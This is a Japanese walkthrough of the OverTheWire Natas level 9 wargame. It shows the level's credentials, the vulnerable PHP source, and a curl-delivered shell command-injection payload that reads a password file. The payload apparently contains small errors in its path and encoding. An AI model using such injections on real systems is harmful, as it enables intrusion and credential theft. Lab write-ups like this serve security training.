# NATAS9

- Username: natas9
- Password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
- URL: http://natas9.natas.labs.overthewire.org

```
$ curl -u natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl http://natas9.natas.labs.overthewire.org
```
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas9", "pass": "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl" };</script></head>
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
ヒントに
```
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```
と書いてあります。  
ブラウザで`http://natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl@natas9.natas.labs.overthewire.org/index-source.html`にアクセスします。
```
...
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>
...
```
コードをみると`$key`が空文字でなければ`dictionary.txt`の中に`$key`の値があるか判断しています。  
想定するコードは以下の通りです。()
```
$ grep -i ; cat /etc/natas_webpass/natas9 dictionary.txt
```
なので`key=; cat /etc/natas\_webpass/natas9`となるようにします。  
urlencodeするために`urlencode`という関数を定義します。
```sh
function urlencode {
  echo "$1" | nkf -WwMQ | sed 's/=$//g' | tr = % | tr -d '\n'
}
```

```
$ urlencode "; cat /etc/natas\_webpass/natas9"
```
```
%3B%20cat%20%2Fetc%2Fnatas%5C%5Fwebpass%2Fnatas9
```
```
$ curl -u natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl \
       -d "needle=%3B%20cat%20%2Fetc%2Fnatas%5C%5Fwebpass%2Fnatas9&submit=Search" \
          http://natas9.natas.labs.overthewire.org |
  head -n 30
```
